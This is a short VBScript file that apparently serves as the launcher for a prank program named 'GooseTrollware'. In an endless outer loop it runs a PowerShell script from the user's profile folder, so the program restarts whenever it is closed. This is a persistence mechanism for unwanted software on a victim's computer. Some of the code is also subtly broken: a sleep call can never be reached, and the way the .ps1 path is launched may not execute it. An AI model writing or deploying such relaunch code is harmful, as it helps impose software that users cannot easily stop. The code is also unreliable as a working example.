Do
    Set objShell = CreateObject("WScript.Shell")
    strHomeDir = objShell.ExpandEnvironmentStrings("%userprofile%")
    strExePath = strHomeDir & "\GooseTrollware\start.ps1"
    Do
        objShell.Run Chr(34) & strExePath & Chr(34), 1, True
        Exit Do
        WScript.Sleep 5000
    Loop
Loop